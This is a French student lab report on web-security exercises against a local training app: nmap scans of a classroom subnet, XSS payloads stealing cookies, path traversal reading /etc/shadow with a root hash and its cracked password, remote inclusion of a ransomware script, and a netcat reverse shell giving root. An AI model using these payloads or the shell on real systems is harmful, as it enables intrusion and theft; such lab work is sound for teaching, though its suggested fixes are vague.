# TP6 : 
## Exercice 1 :

#### Question 4 :

* J'ai fait iut-scan | grep a19 pour écupérer les IPs de la A19, puis j'ai fait un nmap -PO ce toute ces IPs : 
    * nmap -PO 192.168.126.142 192.168.126.144 192.168.126.145 192.168.126.146 192.168.126.147 192.168.126.148 192.168.126.149 192.168.126.150 192.168.126.151 192.168.126.152 192.168.126.153 192.168.126.157 192.168.126.158

* Après scan, on voit que les ports 22,80,111,113 et 3389 sont ouverts sur toute les machines.

#### Question 5 :

* nmap -sS 192.168.126.149

#### Question 6 :

* nmap -A 192.168.126.149

#### Question 7 :

* Ce programme se connecte à SSH et sort differentes informations sur la machine qui a été précisé, en les regroupant dans des catégories, comme "fingerprints" ou alors "host-key algorithms".


---

## Exercice 2 

### Question 1 :

Una attaque XSS réfléchie est une attaque d'insertion de code sur un sitedans l'adresse html.

Pour attaquer le site nous pouvons ajouter le code suivant à l'adresse pour afficher les cookies actuels : 

    http://127.0.0.1:5000/?q="><script> alert(document.cookie)</script>

### Question 2 :

L'attaque stocké a elle lieu sur les site ou l'on peut publier des éléments comme des forum,
Sur notre site on peut injecter en publiant le commentaire suivant pour effectuer la même action :

    <script> alert(document.cookie)</script>


## Exercice 3 :

##### Question 1:

* Lorsqu'on fait une recherche dans les commentaires, on voit que le lien de la page change, en prenant comme arguments un q qui represente le terme que l'on recherche. Par conséquent, si on met q=/etc/shadow, cela affiche un "commentaire" qui represente en fait cette page. Pour éviter cela, il faut configurer le serveur de ce site afin de rediriger les utilisateurs en fonction des caratères qu'ils rentrent, pour éviter qu'ils accèdent à tout.

* Le mot de passe root est :

    \$6\$xfQ2f9VFUa4pWlZh$XoLIEf1CesvhMsBM24Tnn1LBd2U7OMtzUWf4Or5Dd9DcAjEDoeFvzI4PgSAaJA1z9tg1Lvto4W/bUMubt

Qui donne au final domino.

* Le lien : http://127.0.0.1:5000/?q=/etc/shadow

#### Question 2 :

* Comme pour la question précédente, on rajoute dans l'argument q le lien vers la page, donc http://perdu.com.

* Nous avons donc un lien comme ceci : http://127.0.0.1:5000/?q=http://perdu.com

* Pour contrer cette attaque, comme pour la question 1, il faut faire des redirections lorsqu'on modifie le lien.

#### Question 3 :

* Pareil que la question précédente, on met le lien dans l'argument q du site. Cependant, cette fois le lien que l'on intègre est prévu pour cela, donc on effectue une attaque sur le site et on demande des bitcoins en échange du décryptage de nos fichiers.

* Le lien de la page : http://127.0.0.1:5000/?q=https://sancy.iut.uca.fr/~lafourcade/SECWEB/attack.pyb

* Même vulnerabilité que la question précédente.

## Exercice 4 :

### Question 1 : 
En exécutant la commande suivante, on se rend compte que nous sommes sur le serveur :

    print(os.getcwd())

### Question 2 : 

On peut ouvrir le port en écoute sur le nouveau terminal avec la commande suivante( l'option k est pratique mais bloque l'attaque): 

    nc -l 5555 -v 

### Question 3 : 

Pour exécuter des commandes bash en Python on peut utiliser la librairie subprocess, le résultat est affiché côté serveur, seul le code de retour est côté client: 

    import subprocess
    subprocess.run("ls")

### Question 4 :

On se connecte au nc qui écoute et on lance le /bin/sh sur celui-ci avec : 

    subprocess.run(["nc","host.docker.internal","55555","-e","/bin/sh"])

On a alors accès à un terminal en tant que root sur le serveur.

### Question 5 :
On peut voir en tapant la commande whoami sur le terminal en écoute que l'on est root sur le serveur : 

    whoami 
